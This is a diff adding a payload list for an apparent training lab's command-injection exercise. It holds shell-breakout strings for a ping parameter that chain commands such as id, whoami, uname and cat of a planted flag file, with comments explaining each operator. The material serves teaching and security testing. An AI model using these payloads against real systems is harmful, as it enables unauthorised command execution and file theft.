@@ -1,0 +1,46 @@
+# OS command-injection payloads for weblab's command_injection engine.
+#
+# One payload per non-comment line; blank lines and lines starting with '#'
+# are ignored. Each payload is the VALUE for the /ping?host= parameter, which
+# the demo app concatenates into a shell command ("ping -c1 <host>") and runs.
+#
+# A safe app treats the whole value as a single hostname argument, so a payload
+# like "127.0.0.1; id" pings a host literally named "127.0.0.1; id" and never
+# runs `id`. The demo app passes the string to a shell, so the metacharacter
+# (`;` `|` `&&` `||` backtick `$()`) BREAKS OUT of the ping command and the
+# second command runs -- that command-chaining IS the bug.
+#
+# NOTE: the lab uses a *simulated* shell -- the metacharacter parsing and the
+# command outputs are faithfully reproduced, but attacker input never reaches a
+# real os.system / subprocess on the host.
+
+# --- the canonical separator breakout: ; chains a second command ---
+# `id` is the classic "what privileges do I have?" probe (returns www-data here).
+127.0.0.1; id
+127.0.0.1; whoami
+127.0.0.1; uname -a
+127.0.0.1; pwd
+
+# --- the headline exploit: read the planted secret file ---
+# `cat secret/cmd_flag.txt` dumps the command-injection prize.
+127.0.0.1; cat secret/cmd_flag.txt
+127.0.0.1; ls secret
+127.0.0.1; cat /secret/cmd_flag.txt
+
+# --- alternate breakout operators (all work in a shell context) ---
+# Pipe, AND/OR chains, and a newline are equivalent breakout primitives.
+127.0.0.1 | id
+127.0.0.1 || id
+127.0.0.1 && cat secret/cmd_flag.txt
+127.0.0.1 | cat secret/cmd_flag.txt
+
+# --- command substitution: $(...) and backticks run BEFORE the outer command ---
+# The substituted command's output is spliced into ping's argument list.
+127.0.0.1 $(cat secret/cmd_flag.txt)
+127.0.0.1 $(id)
+`cat secret/cmd_flag.txt`
+`id`
+
+# --- a unique-sentinel echo: arbitrary-command proof independent of the flag ---
+# A safe app never prints this token on its own line; a vulnerable one runs echo.
+127.0.0.1; echo weblab-cmdi-canary
